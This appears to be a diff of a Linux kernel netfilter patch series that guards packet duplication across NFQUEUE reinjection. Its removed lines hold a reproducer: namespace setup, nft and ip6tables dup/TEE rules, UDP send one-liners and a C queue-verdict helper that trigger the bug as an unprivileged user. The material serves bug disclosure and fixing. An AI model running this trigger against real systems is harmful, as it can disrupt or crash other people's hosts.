-separate bounded TTL/hop-limit and netdev/XDP validation results are
-summarized above.
-
-The following commands ran as an unprivileged user in a new user/network
-namespace. First create a veth pair and assign 198.18.0.1/24 to v0 and
-198.18.0.2/24 to v1, then bring both links up. Install these output hooks:
-
-    nft add table ip t
-    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
-    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
-    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
-    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
-    nft add rule ip t queue1 udp dport 5555 queue num 0
-    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0
-
-Start the verdict process in the background, send three UDP datagrams to
-198.18.0.2 port 5555, then wait for the helper to exit:
-
-    ./nfq_accept 1 4 &
-    q=$!
-    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
-    wait "$q"
-
-The included helper returns NF_ACCEPT for each queued packet and reports
-callback and verdict counts.
-
-For the IPv6 xt_TEE test, the same helper was run in a non-initial
-user/network namespace after creating a veth pair with fd00::1/64 on v0
-and fd00::2/64 on v1. The guest test fixture pre-created
-/run/xtables.lock with mode 0666 as guest root:
-
-    touch /run/xtables.lock
-    chmod 0666 /run/xtables.lock
-
-The rules and one-packet trigger were:
-
-    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
-    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
-    ./nfq_accept 1 6 &
-    q=$!
-    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
-    wait "$q"
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <signal.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/time.h>
-#include <unistd.h>
-#define NF_ACCEPT 1
-#define NF_DROP 0
-#define NF_REPEAT 4
-#define NF_STOP 5
-#include <libnetfilter_queue/libnetfilter_queue.h>
-
-static volatile sig_atomic_t stop;
-static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
-static const char *mode = "accept";
-static struct nfq_q_handle *queue;
-static void alarm_handler(int sig) { (void)sig; stop = 1; }
-static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
-              struct nfq_data *nfa, void *data)
-{
-    (void)nfmsg; (void)data;
-    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
-    if (!ph) return 0;
-    uint32_t id = ntohl(ph->packet_id);
-    callbacks++;
-    if (!strcmp(mode, "slow")) usleep(100000);
-    uint32_t verdict = NF_ACCEPT;
-    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
-    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
-    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
-    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
-    if (rv >= 0) verdict_ok++;
-    else verdict_fail++;
-    return 0;
-}
-int main(int argc, char **argv)
-{
-    int seconds = argc > 1 ? atoi(argv[1]) : 3;
-    signal(SIGALRM, alarm_handler); alarm(seconds);
-    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
-    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
-    if (argc > 3) mode = argv[3];
-    struct nfq_handle *h = nfq_open();
-    if (!h) { perror("nfq_open"); return 1; }
-    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
-    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
-    queue = nfq_create_queue(h, 0, cb, NULL);
-    if (!queue) { perror("nfq_create_queue"); return 3; }
-    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
-    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
-    int fd = nfq_fd(h); char buf[65536];
-    while (!stop) {
-        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
-        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
-        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
-        if (errno == EINTR) continue;
-        perror("recv"); break;
-    }
-    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
-    nfq_destroy_queue(queue); nfq_close(h);
-    return verdict_fail ? 5 : 0;
-}
-
-------END poc.c--------
-
-Changes in v8:
-  - split the v7 NFQUEUE/netdev proposal into focused patches and add a
-    third patch for the ingress TTL/hop-limit limit
-  - preserve the IPv4/IPv6 recursion guard across NFQUEUE reinjection
-  - bound netdev dup depth across software skb/XDP paths
-  - stop IPv4 TTL and IPv6 hop-limit underflow before cloning
-  - limit the netdev claim to software skb/XDP paths and document the
-    MIRRED offload restriction
-  - v7 Link:
-    https://lore.kernel.org/all/cover.1791688819.git.zihanx@nebusec.ai/
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (3):
-  netfilter: nf_dup: preserve guard across NFQUEUE reinjection
-  netfilter: nf_dup_netdev: bound asynchronous duplication
-  netfilter: nf_dup: prevent TTL and hop-limit underflow
-
- drivers/net/veth.c               |  3 +++
- drivers/net/virtio_net.c         |  3 +++
- include/linux/skbuff.h           |  9 +++++++++
- include/net/libeth/xdp.h         |  6 ++++--
+Fixes: cd58bcd9787e ("netfilter: xt_TEE: have cloned packet travel through Xtables too")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Co-developed-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
  include/net/netfilter/nf_queue.h |  1 +
- include/net/xdp.h                | 25 +++++++++++++++++++++++++
- net/core/gro.c                   |  3 +++
- net/core/xdp.c                   | 10 ++++++++++
- net/ipv4/netfilter/nf_dup_ipv4.c |  3 +++
- net/ipv6/netfilter/nf_dup_ipv6.c |  3 +++
- net/netfilter/nf_dup_netdev.c    | 11 ++++++++++-
  net/netfilter/nf_queue.c         |  1 +
  net/netfilter/nfnetlink_queue.c  | 15 ++++++++++++---
- net/xdp/xsk_buff_pool.c          |  2 ++
- 14 files changed, 89 insertions(+), 6 deletions(-)
+ 3 files changed, 14 insertions(+), 3 deletions(-)
 
+diff --git a/include/net/netfilter/nf_queue.h b/include/net/netfilter/nf_queue.h
+index fc3e81c07364..039622d48905 100644
+--- a/include/net/netfilter/nf_queue.h
++++ b/include/net/netfilter/nf_queue.h
+@@ -23,6 +23,7 @@ struct nf_queue_entry {
+ 	struct net_device	*physout;
+ #endif
+ 	struct nf_hook_state	state;
++	bool			in_nf_duplicate;
+ 	bool			nf_ct_is_unconfirmed;
+ 	u16			size; /* sizeof(entry) + saved route keys */
+ 
+diff --git a/net/netfilter/nf_queue.c b/net/netfilter/nf_queue.c
+index 73363ceedebe..44f182eba953 100644
+--- a/net/netfilter/nf_queue.c
++++ b/net/netfilter/nf_queue.c
+@@ -219,6 +219,7 @@ static int __nf_queue(struct sk_buff *skb, const struct nf_hook_state *state,
+ 	*entry = (struct nf_queue_entry) {
+ 		.skb	= skb,
+ 		.skb_dev = skb->dev,
++		.in_nf_duplicate = current->in_nf_duplicate,
+ 		.state	= *state,
+ 		.hook_index = index,
+ 		.size	= sizeof(*entry) + route_key_size,
+diff --git a/net/netfilter/nfnetlink_queue.c b/net/netfilter/nfnetlink_queue.c
+index a3bc00280051..9a8f55498fd5 100644
+--- a/net/netfilter/nfnetlink_queue.c
++++ b/net/netfilter/nfnetlink_queue.c
+@@ -43,6 +43,7 @@
+ #include <net/sock.h>
+ #include <net/tcp_states.h>
+ #include <net/netfilter/nf_queue.h>
++#include <net/net_debug.h>
+ #include <net/netns/generic.h>
+ 
+ #include <linux/atomic.h>
+@@ -368,17 +369,24 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	unsigned int i;
+ 	int err;
+ 	u8 pf;
++	bool old_in_nf_duplicate;
++
++	DEBUG_NET_WARN_ONCE(current->in_nf_duplicate,
++			    "%s called with duplication guard set", __func__);
++	local_bh_disable();
++	old_in_nf_duplicate = current->in_nf_duplicate;
+ 
+ 	net = entry->state.net;
+ 	pf = entry->state.pf;
+ 
++	current->in_nf_duplicate = entry->in_nf_duplicate;
+ 	hooks = nf_hook_entries_head(net, pf, entry->state.hook);
+ 
+ 	i = entry->hook_index;
+ 	if (!hooks || i >= hooks->num_hook_entries) {
+ 		kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);
+ 		nf_queue_entry_free(entry);
+-		return;
++		goto out;
+ 	}
+ 
+ 	hook_entry = &hooks->hooks[i];
+@@ -401,9 +409,7 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	switch (verdict & NF_VERDICT_MASK) {
+ 	case NF_ACCEPT:
+ 	case NF_STOP:
+-		local_bh_disable();
+ 		entry->state.okfn(entry->state.net, entry->state.sk, skb);
+-		local_bh_enable();
+ 		break;
+ 	case NF_QUEUE:
+ 		err = nf_queue(skb, &entry->state, i, verdict);
+@@ -417,6 +423,9 @@ static void nf_reinject(struct nf_queue_entry *entry, unsigned int verdict)
+ 	}
+ 
+ 	nf_queue_entry_free(entry);
++out:
++	current->in_nf_duplicate = old_in_nf_duplicate;
++	local_bh_enable();
+ }
+ 
+ /* return true if the entry has an unconfirmed conntrack attached that isn't owned by us
 -- 
 2.43.0
 
